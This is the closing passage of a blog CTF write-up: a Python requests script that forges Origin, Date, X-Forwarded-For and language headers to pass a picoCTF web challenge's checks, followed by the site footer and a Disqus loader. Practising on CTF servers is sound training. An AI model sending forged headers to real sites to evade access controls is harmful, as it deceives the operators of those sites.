+</span></span><span class=line><span class=cl>           &#34;Origin&#34;: &#34;http://mercury.picoctf.net:52362/&#34;,
+</span></span><span class=line><span class=cl>           &#34;Date&#34;: &#34;Tue, 15 2018 08:12:55 GMT&#34;,
+</span></span><span class=line><span class=cl>           &#34;DNT&#34;: &#34;1&#34;,
+</span></span><span class=line><span class=cl>           &#34;X-Forwarded-For&#34;: &#34;31.15.32.45&#34;,
+</span></span><span class=line><span class=cl>           &#34;Accept-Language&#34;: &#34;sv-SE&#34;,
+</span></span><span class=line><span class=cl>           &#34;Content-Language&#34;: &#34;sv-SE&#34;}
+</span></span><span class=line><span class=cl>r = requests.get(&#34;http://mercury.picoctf.net:52362/&#34;, headers=headers)
+</span></span><span class=line><span class=cl>print(r.text)
+</span></span></code></pre></td></tr></table></div></div><hr></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><link rel=stylesheet href=/scss/partials/comments/disqusjs.min.css><div class=disqus-container><div id=disqus_thread></div><script type=application/javascript>let disqusjs;function loadDisqusJS(){disqusjs=new DisqusJS({shortname:"nian-nian-djia",siteName:"",apikey:"EeDJHm5LanSGfU7SfP7WeDSCFbqfufexYcr46U924hO4cck7lGR9PdtzvHQSxILa",api:"https://disqus.com/api/oauth/2.0/authorize/",admin:"念誠",adminLabel:"@disqus_dU7Jee66r7"})}function lazyLoadDisqusJS(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}let e=document.createElement("script");e.src="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqus.js",e.async=!1,document.body.appendChild(e),e.onload=()=>{loadDisqusJS(),window.addEventListener("onColorSchemeChange",e=>{disqusjs&&loadDisqusJS()})}}let runningOnBrowser=typeof window!="undefined",isBot=runningOnBrowser&&!("onscroll"in window)||typeof navigator!="undefined"&&/(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent),supportsIntersectionObserver=runningOnBrowser&&"IntersectionObserver"in window;if(!isBot&&supportsIntersectionObserver){let e=new IntersectionObserver(function(t){t[0].isIntersecting&&(lazyLoadDisqusJS(),e.disconnect())});e.observe(document.getElementById("disqus_thread"))}else lazyLoadDisqusJS()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript></div><footer class=site-footer><section class=copyright>&copy;
+2023 -
+2025</section><section class=powerby>💜<br>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.29.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
